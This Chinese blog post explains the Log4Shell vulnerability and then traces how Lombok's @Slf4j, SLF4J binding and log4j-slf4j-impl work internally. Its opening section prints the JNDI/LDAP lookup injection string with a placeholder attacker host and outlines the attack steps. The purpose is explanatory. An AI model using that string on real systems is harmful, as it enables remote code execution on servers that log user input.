# 从 Lombok 开始看 @Slf4j

> 参考资料：
> https://projectlombok.org/features/log
> https://github.com/projectlombok/lombok/issues/3063
> 《深入理解 JVM 字节码》
> 《深入理解 Java 虚拟机》
> [blackhat 2016 年议题](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
> https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
> [slf4j 官网](https://www.slf4j.org/manual.html)
> [slf4j github](https://github.com/qos-ch/slf4j)
> %%想要电子书的可以找我%%

# 引入

2021 年 12 月，Apache Java模块Log4j库第一个远程代码执行漏洞被公开披露，该漏洞识别为CVE-2021-44228。此外，还陆续披露了漏洞——CVE-2021-45046和CVE-2021-45105。Log4j可能会成为现代网络安全史上最严重的漏洞。一旦漏洞被利用遭到入侵，服务器就可能会被劫持。
## 漏洞

能攻击到服务器的 **漏洞代码**
`${jndi:ldpa://xx.xx.xx.xx:xxx/xxx}` （ ldpa://恶意代码所在服务器 Ip /恶意代码类名），只需要将这行代码在任意会产生日志输出的输入框内输入就会在应用服务器上运行恶意代码
### 原理
log4j 对于我们来说，最常使用的是用来输出一些变量等，但是 log4j 除了可以输出程序中的变量，它还提供了一个叫 Lookup 的东西，可以用来输出更多内容（系统变量，网络中的变量等）。
Lookup 像是一个接口，具体去哪里查找，怎么查找需要具体模块的实现，而 log4j 已经帮我们把常见的查询途径都进行了实现。
![截屏2023-08-13 22.37.01.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-13%2022.37.01.png)



**JNDI**
Java naming dictionary interface （Java 命名和字典接口），像一个字典一样，通过名称去查询对应的对象
Naming：命名服务，通过名称查找实际对象的服务，例如通过域名查询 IP 地址等
Dictionary：名称服务的一种拓展，除了名称服务中已有的名称到对象的关联信息外，还允许拥有属性信息。
在这图中，我们可以看到 SPI 是他的具体实现层。早在 2016年的时候就有人提出过一个议题"[A Journey From JNDI LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)"，指出当时会有安全问题，2016下半年，jdk 也进行了相关的修复，但是修复的只有 RMI 和 CORBA 方式，LDAP 仍有漏洞，直到此次被爆出。
![Pasted image 20230814075859.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/dataPasted%20image%2020230814075859.png)

**LDPA**
Lightweight Directory Access Protocol：轻量目录访问协议
LDAP也是有client端和server端。server端是用来存放资源，client端用来操作增删改查等操作
LDAP 类似于用一个树状结构将数据联系起来(和查询DNS服务挺类似的)层级搜索

**过程**
1. 黑客传入 `${jndi:ldpa://xx.xx.xx.xx:xxx/xxx}` 到业务服务器，并将 Reference 绑定到自己的命名/目录服务中
2. 应用程序执行查找
3. 应用程序连接到攻击者控制的 JNDI 服务并返回对象
4. 应用程序解码响应并触发有效负载

**核心问题**
Java 允许通过 JNDI 远程去下载一个 Class 文件来加载对象
### 修复
![截屏2023-08-14 14.54.35.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-14%2014.54.35.png)

1. 从2.17.0版本开始(Java 7和Java 6的2.12.3和2.3.1版本)，只有配置中的 lookup 字符串才会递归展开;在任何其他用法中，只解析顶级 lookup，而不解析任何嵌套 lookup。
2. 启用 JNDI 的属性已经从`log4j2.ableleJndi`重命名为三个独立的属性: `log4j2.ableleJndiLookup`、`log4j2.ableleJndiJms`和`log4j2.ableleJndiContextSelector`
3. JNDI 功能在这些版本中得到了加强: 2.3.1、2.12.2、2.12.3或2.17.0。从这些版本开始，对 LDAP 协议的支持已经被删除，只有 JAVA 协议在 JNDI 连接中得到支持。
## 对我们的影响
对于我们来说，除了升级项目中 Log4j 的版本，是不是还需要进行其他的处理。

在项目中，通常我们会使用 @Slf4j 注解来调用日志组件，而 @Slf4j 是来自 lombok 包的，那么在我们升级项目中 log4j 后，lombok 没有升级版本的情况下，@Slf4j 是否还会有安全问题，是否还需要进行其他处理？
![Pasted image 20230804104900.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/dataPasted%20image%2020230804104900.png)

因此，在漏洞发现后没多久，有人在 lombok 项目下提出了这个问题，并且 lombok 的作者也做出了回复
![Pasted image 20230804105811.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/dataPasted%20image%2020230804105811.png)

> lombok 它本身不会受到影响

这个标题里，有一个很灵魂的词 itself，至于为什么，可以看看作者的回复

> 参考
> [blackhat 2016 年议题](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
> https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
> [github 地址](https://github.com/projectlombok/lombok/issues/3063)
# 作者说
![截屏2023-08-08 20.28.23.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-08%2020.28.23.png)

**最新评估**
1. 这个漏洞只存在 Log4j 2.16.0 版本以下的包中，不存在其他任何日志组件中
2. Lombok 并没有引用 Log4j 任何包，也没有声明任何依赖
3. 如果你使用 lombok的任何外部特性，像@Log4j，lombok 将生成使用这些包的代码，你应该维护对这些包的直接或间接引用，否则 lombok 将会编译失败
4. 同样，你也有责任维护运行时有这些包，否则类初始化可能将会失败
5. 在 lombok 的测试代码中，我们曾经有一个包含这个漏洞版本，但是由于测试不参与任何输入输出并且生成的代码并没有被执行，运行测试并没有导致执行测试的机器上出现 RCE
所以，lombok 本身并不需要任何改变，并且对那些可能引进了有漏洞的 Log4j 包的项目的安全问题没有责任

## else
![截屏2023-08-08 20.47.05.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-08%2020.47.05.png)

在一个新建的 SpringBoot 项目中，我们也可以看到 lombok 的包是非常干净的，并没有引用其他组件
# 为什么能这么做

## Lombok 做了什么
为了知道 Lombok 到底帮助我们做了什么，首先创建一个干净的 SpringBoot项目，引入 Lombok 的依赖。然后在类上添加 @Slf4j 注解，然后再进行编译，我们在 class 文件可以看到 **@Slf4j** 实际的作用只是帮我们生成一行通过工厂获取一个 Logger 对象的方法，所以这也是说 lombok 本身是安全的原因。
![截屏2023-08-09 19.17.19.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-09%2019.17.19.png)


### 编译时注解
点进 @slf4j 注解会发现他是 @Retention(RetentionPolicy.SOURCE) 编译时注解（编译时注解最早是在 Java 6 的 JSR-269 提案中提出）

> **编译时注解**：编译时注解是程序在编译期间通过注解处理器处理的
> **运行时注解**：程序在运行时通过反射获取注解然后处理

1. 首先找到 Class 文件的入口，这里面有提到两个 Processor，因为想看相关于注解的部分所以去看AnnotationProcessor类（至于为什么要去这里找，是因为 lombok 使用了 SPI 机制）

>**SPI**：Service provider interface
>Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是 **解耦**
>SPI 机制本质是将 **接口实现类的全限定名配置在文件中**，并由服务加载器读取配置文件，加载文件中的实现类，**这样运行时可以动态的为接口替换实现类**。在真实项目中，就是在 `META-INF/services` 下面定义个文件，然后通过一个特殊的类加载器，启动的时候加载定义文件中的类，这样就能扩展原有框架的功能


![截屏2023-08-10 09.46.10.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-10%2009.46.10.png)

2. 在 AnnotationProcessor 类中定义了一个 instance 实例，它会通过 createWrappedInstance() 方法创建一个实例，这是一个继承自AbstractProcessor 的 ShadowClassLoader 对象。

```java
public static class AnnotationProcessor extends AbstractProcessor {  
	private final AbstractProcessor instance = createWrappedInstance();
	...  
	private static AbstractProcessor createWrappedInstance() {  
		ClassLoader cl = Main.getShadowClassLoader();  
		try {  
			Class<?> mc = cl.loadClass("lombok.core.AnnotationProcessor");  
			return (AbstractProcessor) mc.getDeclaredConstructor().newInstance();  
		} catch (Throwable t) {  
			if (t instanceof Error) th。ow (Error) t;  
			if (t instanceof RuntimeException) throw (RuntimeException) t;  
			throw new RuntimeException(t);  
	}  
}  
}
```
3. ShadowClassLoader 是一个类加载器，它将会去获取到所有以 .SLC.lombok 结尾的文件（这些文件其实本质还是 class 文件，使用.SLC.lombok 后缀只是为了防止污染用户项目的命名空间）
```java
static synchronized ClassLoader getShadowClassLoader() {  
	if (classLoader == null) {  
		classLoader = new ShadowClassLoader(Main.class.getClassLoader(), "lombok", null, Arrays.<String>asList(), Arrays.asList("lombok.patcher.Symbols"));  
	}  
	return classLoader;  
}
```

4. 在 lombok 包下包含了很多处理注解的 handle 类，分别处理不同的注解，他们都继承自 lombok.javac.JavacAnnotationHandler 类，并实现了其 handle() 方法。其中HandleLog.SLC.lombok 文件就包含了对 @Slf4j 的处理
![截屏2023-08-12 14.44.40.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-12%2014.44.40.png)


5. 我们再继续看这个 handle 方中调用的真正处理注解的 processAnnotation() 方法，在 processAnnotation () 方法中最重要的就是这个 createField() 方法
```java
	private static boolean createField(LoggingFramework framework, JavacNode typeNode, JCFieldAccess loggingType, JCTree source, String logFieldName, boolean useStatic, String loggerTopic) {  
	JavacTreeMaker maker = typeNode.getTreeMaker();  
	// 生成我们在 class 文件看见的变量log
	// private static final <loggerType> log = <factoryMethod>(<parameter>);  
	//JCExpression：标识表达式语法树节点
	JCExpression loggerType = chainDotsString(typeNode, framework.getLoggerTypeName());  
	JCExpression factoryMethod = chainDotsString(typeNode, framework.getLoggerFactoryMethodName());  
	JCExpression loggerName;  
	if (!framework.passTypeName) {  
		loggerName = null;  
	} else if (loggerTopic == null || loggerTopic.trim().length() == 0) { 
		loggerName = framework.createFactoryParameter(typeNode, loggingType);  
	} else {  
		loggerName = maker.Literal(loggerTopic);  
	}  
	JCMethodInvocation factoryMethodCall = maker.Apply(List.<JCExpression>nil(), factoryMethod, loggerName != null ? List.<JCExpression>of(loggerName) : List.<JCExpression>nil());  
	//生成变量语法树节点（访问标识、变量名、变量类型、初始化表达式）
	JCVariableDecl fieldDecl = recursiveSetGeneratedBy(maker.VarDef(  
		maker.Modifiers(Flags.PRIVATE | Flags.FINAL | (useStatic ? Flags.STATIC : 0)),  
		typeNode.toName(logFieldName), loggerType, factoryMethodCall), source, typeNode.getContext());  
	//将节点放入抽象语法树中
	injectFieldAndMarkGenerated(typeNode, fieldDecl);  
	return true;  
}
```

> 抽象语法树：是[源代码](https://zh.wikipedia.org/wiki/%E6%BA%90%E4%BB%A3%E7%A0%81 "源代码")[语法](https://zh.wikipedia.org/wiki/%E8%AF%AD%E6%B3%95%E5%AD%A6 "语法学")结构的一种抽象表示。它以[树状](https://zh.wikipedia.org/wiki/%E6%A0%91_(%E5%9B%BE%E8%AE%BA) "树 (图论)")的形式表现[编程语言](https://zh.wikipedia.org/wiki/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80 "编程语言")的语法结构。抽象语法树的每一个节点都代表着程序代码中的一个语法结构（Syntax Construct），例如包、类型、修饰符、运算符、接口、返回值甚至连代码注释等都可以是一种特定的语法结构。
> JSR 269: 允许开发者在编译期间对注解进行处理，可以读取修改、添加抽象语法树中的内容。

javac 对代码的编译过程如下图所示，在 parse和enter 这个阶段会根据代码生成最初版的抽象语法树，然后 Annotation Processing 这个环节根据不同注解调用不同的 Handler 修改了抽象语法树，JSR 269 就发生在这一个阶段。经过注解处理的抽象语法树就会交给下游处理，直至生成最终的 class 文件

## 对我们有什么用
了解了编译的机制和处理过程，我们也可以自己编写一些代码规范检查器，自动生成代码的注解，但是值得注意的是，在编写代码过程中我们会调不到自动生成的方法但是不会影响他的使用，如果想要和 lombok 一样方便还需要 idea 插件的支持


> 参考资料：
> 《深入了解 Java 虚拟机》 第 10.2.3 章
> 《深入了解 JVM 字节码》 第 8 章
## Slf4j 做了什么

 lombok 的作用是帮我们生成下面这行代码，那么 Slf4j (simple logging facade for java)才是这行代码的处理者
 ```java
 private static final Logger log = LoggerFactory.getLogger(LogDemoApplication.class);
```

但是当真正使用时，会发现只引入 Slf4j 的包在编译时没有问题，在真正调用 log 方法时仍然会报错，因为正如他的全名所言，Slf4j 用到了外观模式
### 外观模式
**概念**：提供了一个统一的接口，用来访问子系统中的一群接口，外观定义了一个高层接口，让子系统更容易使用

**图解**
Slf4j 制定了 log 日志的使用标准，提供了高层次的接口，在使用过程中只需要依赖接口和工厂类就可以实现日志的打印，完全不用关心日志内部的实现细节

**优点**
1. 解耦，减少系统的项目依赖
2. 接口和实现分离，屏蔽了底层的实现细节，面向接口编程

### 源码
从 getLogger 的方法一层层地跟踪，我们会发现最后会走到一个 bind 的方法，这个地方应该就是绑定具体实现框架的地方
`LoggerFactory.getLogger(Class<?> clazz)`
`LoggerFactory.getLogger(String name)`
`LoggerFactory.getILoggerFactory()`
`LoggerFactory.performInitialization()`
`LoggerFactory.bind()`

```java
private final static void bind() {  
try {  
	Set<URL> staticLoggerBinderPathSet = null;  
	// skip check under android, see also  
	// http://jira.qos.ch/browse/SLF4J-328  
	// 通过类加载器去加载所有该路径的资源“org/slf4j/impl/StaticLoggerBinder.class”，并对没有找到和找到多个的情况进行合理提示
	if (!isAndroid()) {  
		staticLoggerBinderPathSet = findPossibleStaticLoggerBinderPathSet(); 
		reportMultipleBindingAmbiguity(staticLoggerBinderPathSet);  
	}  
	// the next line does the binding  
	// 进行真正的绑定，获取 StaticLoggerBinder 实例
	StaticLoggerBinder.getSingleton();  
	INITIALIZATION_STATE = SUCCESSFUL_INITIALIZATION;  
	reportActualBinding(staticLoggerBinderPathSet);  
	fixSubstituteLoggers();  
	replayEvents();  
	// release all resources in SUBST_FACTORY  
	SUBST_FACTORY.clear();  
	} catch (NoClassDefFoundError ncde) {  
		String msg = ncde.getMessage();  
		if (messageContainsOrgSlf4jImplStaticLoggerBinder(msg)) {  
		INITIALIZATION_STATE = NOP_FALLBACK_INITIALIZATION;  
			Util.report("Failed to load class \"org.slf4j.impl.StaticLoggerBinder\".");  
			Util.report("Defaulting to no-operation (NOP) logger implementation");  
			Util.report("See " + NO_STATICLOGGERBINDER_URL + " for further details.");  
		} else {  
			failedBinding(ncde);  
			throw ncde;  
		}  
	} catch (java.lang.NoSuchMethodError nsme) {  
		String msg = nsme.getMessage();  
		if (msg != null && msg.contains("org.slf4j.impl.StaticLoggerBinder.getSingleton()")) {  
			INITIALIZATION_STATE = FAILED_INITIALIZATION;  
			Util.report("slf4j-api 1.6.x (or later) is incompatible with this binding.");  
			Util.report("Your binding is version 1.5.5 or earlier.");  
			Util.report("Upgrade your binding to version 1.6.x.");  
		}  
		throw nsme;  
	} catch (Exception e) {  
		failedBinding(e);  
		throw new IllegalStateException("Unexpected initialization failure", e);  
	}  
}
```
![截屏2023-08-13 15.34.55.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-13%2015.34.55.png)


可以看到 StaticLoggerBinder 的实例是在真正日志实现框架包下的，所以当没有引入真正的日志实现框架时就会抛出 NoClassDefFoundError 异常。但是 SLF4J 的源码中没有 StaticLoggerBinder 又是怎么通过编译的，去看他的源码，会发现源代码中是有实现类的，只是在打包时通过排除了
### else
1. Slf4j 提供了常用日志框架的桥接包，以及详细的文档描述，使用起来非常简单。在 slf4j 的官网中也有一张对具体的日志框架的支持图
	![Pasted image 20230813141525.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/dataPasted%20image%2020230813141525.png)

2. Slf4j 在 2.0.0 及之后的版本中也使用了 SPI 机制，因为和 lombok 类似就不再赘述。现在桥接包只需要在 META-INF/services/ 下定义一个文件 org.slf4j.spi.SLF4JServiceProvider(命名为SLFJ4提供的接口名)，并且文件中指定实现类。只要引入这个桥接包，就可以适配到对应实现的日志框架。
3. 在findPossibleStaticLoggerBinderPathSet() 方法中，当在路径下寻找实现类时，他是使用 LinkedHashSet 进行保存的，并且注释里提到，LinkedHashSet 适合用在这里是因为他是有插入顺序的。但是 linkedHashSet 除了在有多个日志组件是能按顺序进行输出外并未发现其他用处，此处存疑

```java
static Set<URL> findPossibleStaticLoggerBinderPathSet() {  
	// use Set instead of list in order to deal with bug #138  
	// LinkedHashSet appropriate here because it preserves insertion order  
	// during iteration  
	Set<URL> staticLoggerBinderPathSet = new LinkedHashSet<URL>();  
	try {  
		ClassLoader loggerFactoryClassLoader = LoggerFactory.class.getClassLoader();  
		Enumeration<URL> paths;  
		if (loggerFactoryClassLoader == null) {  
			paths = ClassLoader.getSystemResources(STATIC_LOGGER_BINDER_PATH);  
		} else {  
			paths = loggerFactoryClassLoader.getResources(STATIC_LOGGER_BINDER_PATH);  
		}  
		while (paths.hasMoreElements()) {  
			URL path = paths.nextElement();  
			staticLoggerBinderPathSet.add(path);  
		}  
	} catch (IOException ioe) {  
		Util.report("Error getting resources from path", ioe);  
	}  
	return staticLoggerBinderPathSet;  
}
```
4. 当 SLF4J 找到多个实现时，会发出警告 `Multiple bindings were found on the class path` 。SLF4J 发出的警告只是一个警告。即使存在多个绑定，SLF4J 也会选择一个日志框架/实现并与之绑定。SLF4J 选择绑定的方式是由 JVM 决定的，并且对于所有实际目的应该被认为是随机的。

> 参考：
> [slf4j 官网](https://www.slf4j.org/manual.html)
> [slf4j github](https://github.com/qos-ch/slf4j)
## log4j 做了什么

### log4j-slf4j-impl
```java
public static ILoggerFactory getILoggerFactory() {  
	// 使用双重检查锁来保证初始化
	if (INITIALIZATION_STATE == UNINITIALIZED) {  
		synchronized (LoggerFactory.class) {  
			if (INITIALIZATION_STATE == UNINITIALIZED) {  
				INITIALIZATION_STATE = ONGOING_INITIALIZATION;  
				performInitialization();  
			}  
		}  
	}  
	switch (INITIALIZATION_STATE) {  
		case SUCCESSFUL_INITIALIZATION:  
			return StaticLoggerBinder.getSingleton().getLoggerFactory();  
		case NOP_FALLBACK_INITIALIZATION:  
			return NOP_FALLBACK_FACTORY;  
		case FAILED_INITIALIZATION:  
			throw new IllegalStateException(UNSUCCESSFUL_INIT_MSG);  
		case ONGOING_INITIALIZATION:  
			// support re-entrant behavior.  
			// See also http://jira.qos.ch/browse/SLF4J-97  
			return SUBST_FACTORY;  
	}  
	throw new IllegalStateException("Unreachable code");  
}
```
当成功初始化后，SLF4J 会通过具体实现包下的 StaticLoggerBinder 拿到他的单例并拿到 LoggerFactory。而我们可以看到 StaticLoggerBinder 中对于单例的实现也是最简单的方式。

```java
private static StaticLoggerBinder SINGLETON = new StaticLoggerBinder();
public static StaticLoggerBinder getSingleton() {  
	return SINGLETON;  
}
```

**单例模式优点**
1. 只有一个实例，减少内存的开销，提高系统性能
2. 防止其他对象对自己的实例化，确保所有对象都访问一个实例
3. 具有一定的伸缩性，类自己来控制实例化进程，类就在改变实例化进程上有相应的伸缩性

**调用流程**
SLF4J 首先通过类加载获得了 StaticLoggerBinder，并通过 getSingleton().getLoggerFactory() 获得了 Logger 工厂类。通过 LoggerFactory 中的 getLogger() 方法获得 Logger 对象，SLF4J-LOG4J-IMPL 实现了 LoggerFactory 接口，并通过调用子类 Log4JLoggerFactory 中的 newLogger 对象来真正获得 Logger。

在 AbstractLoggerAdapter 类中，会用一个弱引用的 HashMap 来存放 LoggerContext 下的 Loggers，他的值通过 ConcurrentMap 来存放名称和 Logger 的对应关系

WeakHashMap ：基于哈希表的 Map 接口实现，带有弱键。当 WeakHashMap 中的 key 不再正常使用时，将自动删除其中的条目。更准确地说，给定 key 的映射的存在并不能防止垃圾收集器丢弃该密钥，即使它可以终止、终止，然后再回收。当一个键被丢弃时，它的条目实际上被从映射中删除，因此这个类的行为与其他 Map 实现有所不同。

所以当一个 LoggerContext 没有被强引用时，这个 LoggerContext 的键值对就会被回收，基于这个特性，这里的 registry 就像是一个基于本地、堆内的缓存——缓存的失效依赖于GC收集器的行为。
```java
protected final Map<LoggerContext, ConcurrentMap<String, L>> registry = new WeakHashMap<>();
@Override  
public L getLogger(final String name) {  
	final LoggerContext context = getContext();  
	final ConcurrentMap<String, L> loggers = getLoggersInContext(context);  
	final L logger = loggers.get(name);  
	if (logger != null) {  
		return logger;  
	}  
	loggers.putIfAbsent(name, newLogger(name, context));  
	return loggers.get(name);  
}

```


# 总结

lombok 的 @slf4j 注解之所以这么好用，是因为从 lombok 到 slf4j 再到 log4j ，每一个层次都通过设计对代码，原理进行了优化，在共同的作用下，实现了好用的日志组件，好用的日志注解。对于我们来说，可以学习 lombok 的原理，实现一些我们自己的代码检查器和代码生成器。可以学习 slf4j 和 log4j 的设计思路和代码实现，让代码更加的优雅，让程序具有更好的稳定性
 